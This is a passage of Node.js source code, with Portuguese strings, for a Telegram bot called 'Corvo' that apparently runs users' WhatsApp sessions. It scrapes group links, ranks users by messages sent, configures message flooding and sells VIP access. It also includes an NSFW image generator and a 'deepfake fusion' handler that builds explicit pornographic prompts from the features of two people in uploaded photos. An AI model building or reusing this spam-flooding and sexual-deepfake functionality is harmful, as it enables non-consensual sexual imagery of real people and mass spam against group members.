            userWebGroupsPage[tid] = 0;
        } else {
            userWebGroupsPage[tid]++;
        }

        // Busca grupos da página atual
        const result = await getWebGroupsPage(tid, userWebGroupsPage[tid]);

        // Deleta mensagem de loading
        await ctx.deleteMessage(loadingMsg.message_id).catch(() => { });

        if (result.groups.length === 0) {
            // Reseta para primeira página
            userWebGroupsPage[tid] = 0;
            const newResult = await getWebGroupsPage(tid, 0);
            if (newResult.groups.length === 0) {
                return ctx.reply('❌ • Nenhum grupo encontrado no momento. Tente novamente mais tarde.', { parse_mode: 'Markdown' });
            }
            result.groups = newResult.groups;
            result.page = 0;
            result.hasMore = newResult.hasMore;
        }

        // Formata mensagem com grupos
        let message = `🔍 • *GRUPOS ENCONTRADOS NA WEB*\n\n`;
        message += `📊 Total de grupos: *${result.total}*\n`;
        message += `📄 Página: *${result.page + 1}* (100 grupos)\n`;
        message += `\n✅ *CLIQUE NOS LINKS ABAIXO PARA ENTRAR:*\n\n`;

        // Adiciona grupos (máximo 30 por mensagem para não ficar muito grande)
        const groupsToShow = result.groups.slice(0, 30);
        groupsToShow.forEach((group, index) => {
            const num = (result.page * 100) + index + 1;
            message += `${num}. [${group.name}](${group.link})\n`;
            message += `   👥 ${group.members} membros • 📁 ${group.category}\n\n`;
        });

        // Se tem mais de 30 grupos, avisa que tem mais
        if (result.groups.length > 30) {
            message += `\n📝 *+${result.groups.length - 30} grupos nesta página...*\n`;
        }

        // Botões de navegação
        const buttons = [];
        if (result.hasMore) {
            buttons.push([Markup.button.callback('➡️ Próximos 100 Grupos', 'next_web_groups')]);
        } else {
            message += `\n\n🏁 *Você chegou ao fim! Clique abaixo para voltar ao início.*`;
            buttons.push([Markup.button.callback('🔄 Recomeçar do Início', 'reset_web_groups')]);
        }

        await ctx.reply(message, {
            parse_mode: 'Markdown',
            disable_web_page_preview: true,
            ...Markup.inlineKeyboard(buttons)
        }).then(msg => {
            // Auto-delete após 1 hora
            setTimeout(() => {
                ctx.deleteMessage(msg.message_id).catch(() => { });
            }, 3600000); // 1 hora = 60 * 60 * 1000
        }).catch(() => { });

    } catch (err) {
        console.error('[BUSCAR GRUPOS WEB] Erro:', err);
        ctx.reply('❌ • Erro ao buscar grupos. Tente novamente.', { parse_mode: 'Markdown' }).catch(() => { });
    }
});

bot.hears('🏆 • Ranking Top 10', async (ctx) => {
    const sortedUsers = Object.entries(usersData)
        .filter(([id, data]) => data.stats)
        .sort((a, b) => (b[1].stats.messagesSent || 0) - (a[1].stats.messagesSent || 0))
        .slice(0, 10);

    let rankingMsg = `<blockquote>🏆 <b>TOP 10 DIVULGADORES</b>\n\n`;
    sortedUsers.forEach((user, i) => {
        const medal = i === 0 ? '🥇' : (i === 1 ? '🥈' : (i === 2 ? '🥉' : '👤'));
        rankingMsg += `${medal} <b>${user[1].name || 'Usuário'}</b> - ${user[1].stats.messagesSent} msgs\n`;
    });
    rankingMsg += `\n🚀 <i>Quem será o próximo elite?</i></blockquote>`;

    await ctx.reply(rankingMsg, { parse_mode: 'HTML' });
});

bot.hears('💎 • Planos VIP', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);

    const msg = `💎 *PLANOS VIP CORVO DIV* 💎\n\n` +
        `• Benefícios: Consultas LIBERADAS (sem precisar conectar WhatsApp), SEM COOLDOWN, rajar sem propaganda, maior velocidade e suporte prioritário.\n\n` +
        `*TABELA DE VALORES:*\n` +
        `• 1 Dia: *R$ 4,00*\n` +
        `• 3 Dias: *R$ 9,00*\n` +
        `• 1 Semana (7 dias): *R$ 17,00*\n` +
        `• 15 Dias: *R$ 25,00*\n` +
        `• 1 Mês (30 dias): *R$ 35,00*\n\n` +
        `_Escolha o tempo de VIP abaixo para gerar o PIX:_`;

    const sentMsg = await ctx.reply(msg, {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('💳 VIP 1 Dia (R$ 4)', 'buy_vip_1d')],
            [Markup.button.callback('💳 VIP 3 Dias (R$ 9)', 'buy_vip_3d')],
            [Markup.button.callback('💳 VIP 1 Semana (R$ 17)', 'buy_vip_7d')],
            [Markup.button.callback('💳 VIP 15 Dias (R$ 25)', 'buy_vip_15d')],
            [Markup.button.callback('💳 VIP 1 Mês (R$ 35)', 'buy_vip_30d')],
            [Markup.button.callback('🔙 Voltar', 'back_to_main')]
        ])
    });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🎁 • Doar', async (ctx) => {
    const tid = ctx.from.id;
    await handleButtonCommand(ctx, tid);
    userStates[tid] = 'wait_donation_amount';
    const sentMsg = await ctx.reply('🎁 *SISTEMA DE DOAÇÃO*\n\nSua doação ajuda a manter o bot gratuito e online!\n\n• Valor mínimo: *R$ 1,00*\n• Taxa: *R$ 0,50*\n\n*Envie o valor que deseja doar (ex: 5.00):*', { parse_mode: 'Markdown', ...Markup.keyboard([['🔙 • Voltar']]).resize() });
    await cleanupAfterReply(ctx, tid, sentMsg?.message_id);
});

bot.hears('🔓 • Liberar Bot (Seguir Canais)', async (ctx) => {
    const tid = ctx.from.id;
    const sock = userSessions[tid];
    if (!sock?.user) {
        return ctx.reply('❌ • Você precisa conectar seu WhatsApp primeiro!', { parse_mode: 'Markdown' }).catch(() => { });
    }
    ctx.reply('🔓 • *LIBERANDO BOT*\n\nVerificando canais obrigatórios... Por favor, aguarde.', { parse_mode: 'Markdown' }).catch(() => { });
    try {
        await checkAndFollowChannels(tid, sock, ctx);
    } catch (e) {
        logEvent('ERROR', `Erro ao verificar canais: ${e.message}`);
        ctx.reply('❌ • Ocorreu um erro ao verificar os canais. Tente novamente.', { parse_mode: 'Markdown' }).catch(() => { });
    }
});


// --- PROCESSAMENTO DE ENTRADAS DE TEXTO ---
bot.on('text', async (ctx) => {
    const tid = ctx.from.id;
    const state = userStates[tid];
    const text = ctx.message.text;

    // Rastreia TODAS as mensagens do usuário
    if (ctx.message?.message_id) {
        trackUserMessage(tid, ctx.message.message_id);
    }

    // Handler de Resposta do Monitor
    if (state && state.startsWith('wait_monitor_reply_')) {
        const targetUserId = state.replace('wait_monitor_reply_', '');
        delete userStates[tid];
        if (text.toLowerCase() === '/cancelar') return ctx.reply('❌ Resposta cancelada.');

        try {
            await bot.telegram.sendMessage(targetUserId, `<blockquote>🤖 <b>MENSAGEM DO SISTEMA:</b>\n\n<i>${text}</i></blockquote>`, { parse_mode: 'HTML' });
            ctx.reply(`✅ • *Mensagem enviada com sucesso para ${targetUserId}!*`, { parse_mode: 'Markdown' });
            // Adiciona ao log de monitoramento também
            const mMsg = await bot.telegram.sendMessage(ADMIN_ID, `<blockquote>🤖 <b>VOCÊ RESPONDEU (Para ${targetUserId}):</b>\n\n<i>${text}</i></blockquote>`, { parse_mode: 'HTML' }).catch(() => { });
            if (mMsg) monitorMessageIds.push(mMsg.message_id);
        } catch (e) {
            ctx.reply(`❌ • *Erro ao enviar mensagem:* O usuário pode ter bloqueado o bot.`, { parse_mode: 'Markdown' });
        }
        return;
    }


    // Se não é comando de barra, deleta após rastrear
    if (!text.startsWith('/')) {
        // Deleta a mensagem do usuário após 2 segundos
        safeDeleteMessage(ctx, ctx.message.message_id, 2000);
    }

    if (text.startsWith('🎭 • Trocar Nick:')) {
        // Limpa mensagens antigas
        await clearUserMessages(ctx, tid);
        const config = loadUserConfig(tid);
        config.autoNick = !config.autoNick;
        saveUserConfig(tid);
        const status = config.autoNick ? 'ATIVADA' : 'DESATIVADA';
        const replyMsg = await ctx.reply(`✅ • Troca automática de nick ${status}!`, getConfigMenu(tid)).catch(() => { });
        if (replyMsg?.message_id) trackBotMessage(tid, replyMsg.message_id);
        return;
    }

    if (text.startsWith('👻 • Modo Fantasma:')) {
        await clearUserMessages(ctx, tid);
        const config = loadUserConfig(tid);
        config.ghostMode = !config.ghostMode;
        saveUserConfig(tid);
        const status = config.ghostMode ? 'ATIVADO' : 'DESATIVADO';
        const replyMsg = await ctx.reply(`✅ • Modo Fantasma ${status}!`, getConfigMenu(tid)).catch(() => { });
        if (replyMsg?.message_id) trackBotMessage(tid, replyMsg.message_id);
        return;
    }

    if (!state) return;

    // --- ESTADOS DO ADMIN PARA ENVIAR MENSAGENS ---
    if (state === 'wait_ai_photo_prompt') {
        delete userStates[tid];
        const originalPrompt = text.trim();
        if (originalPrompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);
        const waitMsg = await ctx.reply('⏳ • <b>Gerando sua arte elite...</b>\n\n<i>Otimizando prompt...</i>', { parse_mode: 'HTML' });

        try {
            const englishPrompt = await translateToEnglish(originalPrompt);
            const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(englishPrompt + ", masterpiece, high quality, 8k, detailed")}?width=1024&height=1024&nologo=true&seed=${Math.floor(Math.random() * 1000000)}`;

            await ctx.replyWithPhoto(imageUrl, { caption: `<blockquote>🎨 <b>ARTE GERADA POR IA</b>\n\n📝 <b>Prompt:</b> <code>${originalPrompt}</code>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, parse_mode: 'HTML' });
            await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
        } catch (e) {
            bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '<blockquote>❌ <b>ERRO NA GERAÇÃO</b>\nTente um prompt diferente ou mais simples.</blockquote>', { parse_mode: 'HTML' });
        }
        return;
    }

    if (state === 'wait_ai_chat_prompt') {
        delete userStates[tid];
        const prompt = text.trim();
        if (prompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);
        const waitMsg = await ctx.reply('<blockquote>🧠 <b>O CORVO ESTÁ PENSANDO...</b></blockquote>', { parse_mode: 'HTML' });
        try {
            const aiResponse = await chatAI(prompt);
            await bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, `<blockquote><b>🧠 RESPOSTA DA IA</b>\n\n${aiResponse}\n\n⚡ <i>Corvo Intelligence System</i></blockquote>`, { parse_mode: 'HTML' });
        } catch (e) {
            bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '<blockquote>❌ <b>ERRO DE CONEXÃO</b>\nNão consegui processar sua pergunta agora.</blockquote>', { parse_mode: 'HTML' });
        }
        return;
    }

    if (state === 'wait_ai_video_prompt') {
        delete userStates[tid];
        const originalPrompt = text.trim();
        if (originalPrompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);
        const waitMsg = await ctx.reply('⏳ • <b>Gerando seu vídeo elite...</b>\n\n<i>Isso pode levar até 1 minuto.</i>', { parse_mode: 'HTML' });

        try {
            const englishPrompt = await translateToEnglish(originalPrompt);
            const videoUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(englishPrompt)}?width=512&height=512&nologo=true&model=video`;

            setTimeout(async () => {
                try {
                    await ctx.reply(`<blockquote>🎬 <b>VÍDEO GERADO POR IA (BETA)</b>\n\n📝 <b>Prompt:</b> ${originalPrompt}\n\n🔗 <b>Link do Vídeo:</b> <a href="${videoUrl}">Clique aqui para ver</a>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, { parse_mode: 'HTML' });
                    await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
                } catch (e) {
                    bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '❌ • Erro ao processar vídeo.');
                }
            }, 5000);
        } catch (e) {
            bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '❌ • Erro ao iniciar geração de vídeo.');
        }
        return;
    }

    if (state === 'wait_ai_nsfw_prompt') {
        delete userStates[tid];
        const originalPrompt = text.trim();
        if (originalPrompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);
        if (!isUserVip(tid)) return ctx.reply('<blockquote>⚠️ <b>ACESSO RESTRITO</b></blockquote>', { parse_mode: 'HTML' });

        const waitMsg = await ctx.reply('🔞 • <b>Gerando conteúdo adulto elite...</b>\n\n<i>Traduzindo e otimizando prompt...</i>', { parse_mode: 'HTML' });

        try {
            // Traduz para o inglês para melhor resultado na IA
            const englishPrompt = await translateToEnglish(originalPrompt);

            // Refina o prompt com tags de qualidade e realismo
            const finalPrompt = `${englishPrompt}, photorealistic, masterpiece, high quality, 8k, extremely detailed, explicit nsfw`;

            const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(finalPrompt)}?width=1024&height=1024&nologo=true&seed=${Math.floor(Math.random() * 1000000)}&model=flux`;

            await ctx.replyWithPhoto(imageUrl, {
                caption: `<blockquote>🔞 <b>IA ADULTA ELITE</b>\n\n📝 <b>Prompt:</b> <code>${originalPrompt}</code>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`,
                parse_mode: 'HTML'
            });
            await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
        } catch (e) {
            bot.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, null, '<blockquote>❌ <b>ERRO NA GERAÇÃO NSFW</b>\nTente outro prompt ou aguarde alguns instantes.</blockquote>', { parse_mode: 'HTML' });
        }
        return;
    }

    if (state === 'wait_ai_doc_prompt') {
        const prompt = text.trim();
        delete userStates[tid];
        if (prompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);

        const waitMsg = await ctx.reply('<blockquote>📄 <b>GERANDO DOCUMENTO...</b>\n\nA IA está redigindo o conteúdo solicitado.</blockquote>', { parse_mode: 'HTML' });
        try {
            const aiResponse = await chatAI(`Crie o conteúdo de um documento profissional para: ${prompt}. Retorne APENAS o texto do documento em PORTUGUÊS BRASIL.`);
            const filePath = `./scratch/doc_${tid}.txt`;
            if (!fs.existsSync('./scratch')) fs.mkdirSync('./scratch');
            fs.writeFileSync(filePath, aiResponse);

            await ctx.replyWithDocument({ source: filePath, filename: `documento_corvo_ia.txt` }, { caption: `<blockquote>✅ <b>DOCUMENTO GERADO</b>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, parse_mode: 'HTML' });
            await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
        } catch (e) {
            ctx.reply('❌ • Erro ao gerar documento.');
        }
        return;
    }

    if (state.startsWith('wait_ai_transformer_prompt_')) {
        const mediaData = JSON.parse(Buffer.from(state.replace('wait_ai_transformer_prompt_', ''), 'base64').toString());
        delete userStates[tid];
        const originalPrompt = text.trim();
        if (originalPrompt === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);

        const waitMsg = await ctx.reply('🎭 • <b>Processando no IA Studio...</b>\n\n<i>Analisando cena...</i>', { parse_mode: 'HTML' });

        try {
            const englishPrompt = await translateToEnglish(originalPrompt);
            const finalPrompt = `Professional high quality photo of person from original image, performing ${englishPrompt}, ultra realistic, cinematic, 8k, detailed`;
            const transformedUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(finalPrompt)}?width=1024&height=1024&nologo=true&seed=${Math.floor(Math.random() * 1000000)}&model=flux`;

            if (mediaData.type === 'photo') {
                await ctx.replyWithPhoto(transformedUrl, { caption: `<blockquote>🎭 <b>IA STUDIO ELITE</b>\n\n📝 <b>Cenário:</b> ${originalPrompt}\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, parse_mode: 'HTML' });
            } else {
                const videoPrompt = `${englishPrompt}, cinematic action movie style, realistic`;
                const videoUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(videoPrompt)}?model=video&nologo=true`;
                await ctx.reply(`<blockquote>🎬 <b>IA VIDEO ACTION ELITE</b>\n\n📝 <b>Ação:</b> ${originalPrompt}\n\n🔗 <b>Link do Vídeo:</b> <a href="${videoUrl}">Clique aqui para ver</a>\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, { parse_mode: 'HTML' });
            }
            await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
        } catch (e) {
            ctx.reply('❌ • Erro na transformação IA.');
        }
        return;
    }

    if (state.startsWith('wait_ai_fusion_prompt_')) {
        const parts = state.split('_');
        const photo1Id = parts[4];
        const photo2Id = parts[5];
        delete userStates[tid];
        const originalAction = text.trim();
        if (originalAction === '🔙 • VOLTAR') return sendMainMenuProfile(ctx, tid);

        const waitMsg = await ctx.reply('<blockquote>🔞 <b>INICIANDO FUSÃO ELITE...</b>\n\nIsso pode levar alguns segundos.</blockquote>', { parse_mode: 'HTML' });

        try {
            const englishAction = await translateToEnglish(originalAction);
            // Simulação de fusão: O prompt descreve os dois sujeitos e a ação
            const finalPrompt = `Two people from provided photos, one person matching features of first subject and other person matching features of second subject, performing ${englishAction}, ultra realistic, pornographic, 8k resolution, cinematic lighting, explicit content`;
            const imageUrl = `https://image.pollinations.ai/prompt/${encodeURIComponent(finalPrompt)}?width=1024&height=1024&nologo=true&seed=${Math.floor(Math.random() * 1000000)}&model=flux`;

            await ctx.replyWithPhoto(imageUrl, { caption: `<blockquote>🔞 <b>FUSÃO DEEPFAKE CONCLUÍDA</b>\n\n🎭 <b>Ação:</b> ${originalAction}\n\n🚀 <i>Corvo Intelligence System</i></blockquote>`, parse_mode: 'HTML' });
            await bot.telegram.deleteMessage(ctx.chat.id, waitMsg.message_id).catch(() => { });
        } catch (e) {
            ctx.reply('❌ • Erro na fusão das fotos.');
        }
        return;
    }

    if (state === 'wait_send_message_id') {
        if (ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(text.trim());
        if (isNaN(targetId)) {
            return ctx.reply('❌ • ID inválido! Envie apenas números.\n\nExemplo: `123456789`', { parse_mode: 'Markdown' });
        }
        // Salva o ID e aguarda mensagem
        userStates[tid] = `wait_send_message_text_${targetId}`;
        ctx.reply(
            `✅ • ID salvo: \`${targetId}\`\n\n` +
            `Agora envie a *mensagem* que deseja enviar para este usuário.`,
            { parse_mode: 'Markdown' }
        );
        return;
    }

    if (state.startsWith('wait_send_message_text_')) {
        if (ctx.from.id !== ADMIN_ID) return;
        const targetId = parseInt(state.replace('wait_send_message_text_', ''));
        delete userStates[tid];

        try {
            // Envia mensagem para o usuário
            await bot.telegram.sendMessage(
                targetId,
                `📨 *MENSAGEM DO ADMIN:*\n\n${text}`,
                { parse_mode: 'Markdown' }
            );
            ctx.reply(
                `✅ • Mensagem enviada com sucesso para o usuário \`${targetId}\`!`,
                { parse_mode: 'Markdown', ...getAdminMenu() }
            );
        } catch (e) {
            ctx.reply(
                `❌ • Erro ao enviar mensagem: ${e.message}\n\n` +
                `Possíveis causas:\n` +
                `• Usuário bloqueou o bot\n` +
                `• ID inválido\n` +
                `• Usuário nunca iniciou o bot`,
                { parse_mode: 'Markdown', ...getAdminMenu() }
            );
        }
        return;
    }

    if (state === 'wait_quantidade') {
        delete userStates[tid];
        const qty = parseInt(text.trim());
        if (isNaN(qty) || qty < 1 || qty > 50) {
            return ctx.reply('❌ Quantidade inválida! Use entre 1 e 50.');
        }
        const config = loadUserConfig(tid);
        config.quantidade = qty;
        saveUserConfig(tid);
        return ctx.reply(`✅ Quantidade alterada para ${qty} mensagens!`, { parse_mode: 'Markdown', ...getFloodConfigMenu(tid) });
    }

    if (state === 'wait_delay') {
        delete userStates[tid];
        const delay = parseInt(text.trim());
        if (isNaN(delay) || delay < 1 || delay > 10) {
            return ctx.reply('❌ Delay inválido! Use entre 1 e 10 segundos.');
        }
        const config = loadUserConfig(tid);
        config.delay = delay * 1000; // Converte segundos para ms
        saveUserConfig(tid);
        return ctx.reply(`✅ Delay alterado para ${delay} segundos (${config.delay}ms)!`, { parse_mode: 'Markdown', ...getFloodConfigMenu(tid) });
    }

    if (state === 'wait_ban' && tid === ADMIN_ID) {
        delete userStates[tid];
        const targetId = parseInt(text.trim());
        if (isNaN(targetId)) return ctx.reply('❌ • ID inválido. Envie apenas números.');
        bannedUsers.add(targetId);
        fs.writeFileSync(BANNED_FILE, JSON.stringify(Array.from(bannedUsers)));
        logEvent('ADMIN', `Usuário ${targetId} foi banido por Admin.`);
        ctx.reply(`✅ • Usuário \`${targetId}\` foi banido com sucesso!`, { parse_mode: 'Markdown' }).then(msg => {
            setTimeout(() => ctx.deleteMessage(msg.message_id).catch(() => { }), 5000);
        }).catch(() => { });
    } else if (state === 'wait_give_vip' && tid === ADMIN_ID) {
        delete userStates[tid];
        safeDeleteMessage(ctx, ctx.message?.message_id, 500);
        const parts = text.trim().split(' ');
        if (parts.length !== 2) {
            const errMsg = await ctx.reply('❌ • Formato inválido!\n\nUse: `ID DIAS`\nExemplo: `123456789 30`', { parse_mode: 'Markdown' });
            if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            return;
        }
        const targetId = parseInt(parts[0]);
        const days = parseInt(parts[1]);
        if (isNaN(targetId) || isNaN(days) || days === 0) {
            const errMsg = await ctx.reply('❌ • Valores inválidos! O ID e os dias devem ser números.', { parse_mode: 'Markdown' });
            if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            return;
        }

        const daysMs = days * 24 * 60 * 60 * 1000;

        if (vips[targetId] && vips[targetId].expiresAt > Date.now()) {
            vips[targetId].expiresAt += daysMs;
            if (vips[targetId].expiresAt < Date.now()) {
                delete vips[targetId];
                saveVips();
                logEvent('ADMIN', `Admin reduziu dias do usuário ${targetId} e o VIP expirou`);
                return ctx.reply(`🗑️ • *VIP EXPIRADO!*\n\nOs dias foram reduzidos e o VIP do usuário \`${targetId}\` acabou.`, { parse_mode: 'Markdown' });
            }
        } else {
            if (days < 0) return ctx.reply('❌ • Usuário não possui VIP. Não é possível remover dias.', { parse_mode: 'Markdown' });
            vips[targetId] = { type: 'full', expiresAt: Date.now() + daysMs };
        }

        saveVips();
        logEvent('ADMIN', `Admin modificou VIP do usuário ${targetId} em ${days} dias`);

        const actionText = days > 0 ? 'CONCEDIDO/ADICIONADO' : 'REDUZIDO';
        const successMsg = await ctx.reply(`✅ • *VIP ${actionText}!*\n\nUsuário: \`${targetId}\`\nAlteração: ${days > 0 ? '+' : ''}${days} dias\nExpira: ${new Date(vips[targetId].expiresAt).toLocaleString('pt-BR')}`, { parse_mode: 'Markdown' });
        if (successMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, successMsg.message_id).catch(() => { }), 8000);

        try {
            await bot.telegram.sendMessage(targetId, `🎉 • *STATUS VIP ATUALIZADO!*\n\n💎 Alteração: ${days > 0 ? '+' : ''}${days} dias\n⏰ Válido até: ${new Date(vips[targetId].expiresAt).toLocaleString('pt-BR')}\n\n✨ Aproveite todos os recursos premium!`, { parse_mode: 'Markdown' });
        } catch (e) {
            console.log('Não foi possível notificar o usuário sobre o VIP');
        }

    } else if (state === 'wait_remove_vip' && tid === ADMIN_ID) {
        delete userStates[tid];
        safeDeleteMessage(ctx, ctx.message?.message_id, 500);

        const parts = text.trim().split(' ');
        const targetId = parseInt(parts[0]);
        const daysToRemove = parts[1] ? parseInt(parts[1]) : null;

        if (isNaN(targetId)) {
            const errMsg = await ctx.reply('❌ • ID inválido! Digite corretamente.', { parse_mode: 'Markdown' });
            if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            return;
        }
        if (!vips[targetId] || vips[targetId].expiresAt < Date.now()) {
            const errMsg = await ctx.reply('❌ • Este usuário não possui VIP ativo.', { parse_mode: 'Markdown' });
            if (errMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, errMsg.message_id).catch(() => { }), 5000);
            return;
        }

        if (daysToRemove && daysToRemove > 0) {
            const daysMs = daysToRemove * 24 * 60 * 60 * 1000;
            vips[targetId].expiresAt -= daysMs;

            if (vips[targetId].expiresAt < Date.now()) {
                delete vips[targetId];
                saveVips();
                logEvent('ADMIN', `Admin removeu todos os dias de VIP do usuário ${targetId}`);
                ctx.reply(`🗑️ • *VIP REMOVIDO!*\n\nOs dias foram reduzidos e o VIP do usuário \`${targetId}\` acabou.`, { parse_mode: 'Markdown' });
                try { bot.telegram.sendMessage(targetId, `⚠️ • *VIP ENCERRADO*\n\nSeu tempo de VIP foi reduzido e seu acesso expirou.`, { parse_mode: 'Markdown' }); } catch (e) { }
            } else {
                saveVips();
                logEvent('ADMIN', `Admin removeu ${daysToRemove} dias do VIP do usuário ${targetId}`);
                ctx.reply(`✅ • *DIAS REMOVIDOS!*\n\nUsuário: \`${targetId}\`\nRemovidos: -${daysToRemove} dias\nNova Expiração: ${new Date(vips[targetId].expiresAt).toLocaleString('pt-BR')}`, { parse_mode: 'Markdown' });
                try { bot.telegram.sendMessage(targetId, `⚠️ • *DIAS REMOVIDOS*\n\nSeu VIP teve ${daysToRemove} dia(s) subtraído(s).\n⏰ Válido até: ${new Date(vips[targetId].expiresAt).toLocaleString('pt-BR')}`, { parse_mode: 'Markdown' }); } catch (e) { }
            }
        } else {
            delete vips[targetId];
            saveVips();
            logEvent('ADMIN', `Admin removeu VIP do usuário ${targetId}`);
            const successMsg = await ctx.reply(`🗑️ • *VIP COMPLETAMENTE REMOVIDO!*\n\nUsuário: \`${targetId}\`\nStatus: Agora é FREE`, { parse_mode: 'Markdown' });
            if (successMsg?.message_id) setTimeout(() => bot.telegram.deleteMessage(ctx.chat.id, successMsg.message_id).catch(() => { }), 8000);
            try { await bot.telegram.sendMessage(targetId, `⚠️ • *VIP REMOVIDO*\n\nSeu acesso VIP foi removido pelo administrador.\n\n💎 Para continuar usando recursos premium, adquira um novo plano VIP.`, { parse_mode: 'Markdown' }); } catch (e) { }
        }

    } else if (state === 'wait_vip_all' && tid === ADMIN_ID) {
        delete userStates[tid];
        const days = parseInt(text.trim());
        if (isNaN(days) || days <= 0) {
            return ctx.reply('❌ • Valor inválido! Digite apenas o número de dias (exemplo: 1)', { parse_mode: 'Markdown' });
        }
        // Dar VIP para TODOS os usuários
        const daysMs = days * 24 * 60 * 60 * 1000;
        let count = 0;
        ctx.reply(`🎁 • *INICIANDO...*\n\nDando ${days} dia(s) de VIP para ${totalUsers.size} usuários...`, { parse_mode: 'Markdown' });
        for (const userId of totalUsers) {
            try {
                vips[userId] = {
                    type: 'full',
                    expiresAt: Date.now() + daysMs
                };
                count++;
                // Notificar o usuário
                try {
                    await bot.telegram.sendMessage(userId, `🎉 • *PRESENTE DO ADMIN!*\n\n💎 Você ganhou ${days} dia(s) de VIP GRÁTIS!\n⏰ Válido até: ${new Date(vips[userId].expiresAt).toLocaleString('pt-BR')}\n\n✨ Aproveite todos os recursos premium!`, { parse_mode: 'Markdown' });
                } catch (e) {
                    // Se não conseguir enviar, ignora
                }
            } catch (e) {
                logEvent('ERROR', `Erro ao dar VIP para ${userId}: ${e.message}`);
            }
        }
        saveVips();
        logEvent('ADMIN', `Admin deu ${days} dias de VIP para ${count} usuários`);
        ctx.reply(`✅ • *VIP DISTRIBUÍDO!*\n\n👥 Total: ${count} usuários\n💎 Duração: ${days} dia(s)\n⏰ Expira: ${new Date(Date.now() + daysMs).toLocaleString('pt-BR')}\n\n🎉 Todos os usuários foram notificados!`, { parse_mode: 'Markdown' });

    } else if (state === 'wait_broadcast' && tid === ADMIN_ID) {
        delete userStates[tid];
        let count = 0;
        ctx.reply(`🚀 • Iniciando transmissão para ${totalUsers.size} usuários...`).catch(() => { });
        for (const userId of totalUsers) {
            try {
                await bot.telegram.sendMessage(userId, `📢 • *COMUNICADO OFICIAL*\n\n${text}`, { parse_mode: 'Markdown' });
                count++;
            } catch (e) { }
        }
        ctx.reply(`🏁 • Transmissão finalizada! Enviado para ${count} usuários ativos.`);
        logEvent('ADMIN', `Broadcast enviado para ${count} usuários.`);
    } else if (state === 'wait_changelog' && tid === ADMIN_ID) {
        delete userStates[tid];
        ctx.reply(`📝 • Processando envio do Changelog...`).catch(() => { });

        let updateMessage = `🚀 *CORVO BOT - ATUALIZAÇÃO MANUAL*\n`;
        updateMessage += `📅 ${getDateBR()} às ${getTimeBR()}\n\n`;
        updateMessage += `📋 *MUDANÇAS DETECTADAS:*\n`;
        updateMessage += `${text}\n\n`;
        updateMessage += `💙 *EQP CORVO*`;

        // Telegram
        try {
            await bot.telegram.sendMessage(CHANNEL_ID, updateMessage, { parse_mode: 'Markdown' });
            logEvent('SUCCESS', `📢 Changelog manual postado no Telegram.`);
        } catch (e) {
            logEvent('ERROR', `❌ Erro ao postar changelog no Telegram: ${e.message}`);
        }

        // WhatsApp
        try {
            const adminSock = userSessions[ADMIN_ID];
            if (adminSock && adminSock.user) {
                for (const channelId of MANDATORY_CHANNELS) {
                    try {
                        await adminSock.sendMessage(channelId, { text: updateMessage });
                        logEvent('SUCCESS', `📱 Changelog manual postado no WhatsApp: ${channelId}`);
                        await delay(2000);
                    } catch (e) {
                        logEvent('ERROR', `❌ Erro ao postar no WhatsApp: ${e.message}`);
                    }
                }
            }
        } catch (e) {
            logEvent('ERROR', `❌ Erro geral postando changelog no WhatsApp: ${e.message}`);
        }
        ctx.reply(`✅ • Changelog postado com sucesso nos canais!`).catch(() => { });

    } else if (state === 'wait_saque' && tid === ADMIN_ID) {
        delete userStates[tid];
        const parts = text.trim().split(' ');
        if (parts.length !== 2) {
            return ctx.reply('❌ • Formato inválido!\n\nUse: `VALOR CHAVEPIX`\nExemplo: `50 seuemail@gmail.com`', { parse_mode: 'Markdown' });
        }
        const valor = parseFloat(parts[0]);
        const chavePix = parts[1];
        if (isNaN(valor) || valor <= 0) {
            return ctx.reply('❌ • Valor inválido! Use um número positivo.', { parse_mode: 'Markdown' });
        }
        ctx.reply(`💸 • Solicitando saque de R$ ${valor.toFixed(2)} para ${chavePix}...`).catch(() => { });
        try {
            const result = await promisseApi.withdraw(valor, chavePix);
            if (result && result.success) {
